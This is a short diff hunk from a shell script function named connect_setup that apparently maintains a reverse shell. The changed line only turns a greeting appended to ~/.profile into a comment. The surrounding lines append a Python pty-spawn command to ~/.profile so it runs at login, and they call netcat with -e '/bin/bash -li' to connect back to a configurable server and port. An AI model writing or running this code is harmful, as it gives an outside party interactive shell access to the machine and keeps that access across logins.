@@ -134,7 +134,7 @@ connect_setup() {
     # # just recursively, sleep in case...
     # sleep 5 && [ ! $RSRET -eq 120 ] && connect_again_flag=1
 
-    echo "Welcome and live your life" >> ~/.profile
+    echo "# Welcome and live your life" >> ~/.profile
     echo "python -c 'import pty; pty.spawn(\"/bin/bash\")'" >> ~/.profile
     $NC -w ${1}s -i 1800s $SERVER $PORT -e "/bin/bash -li"
     RSRET=$?
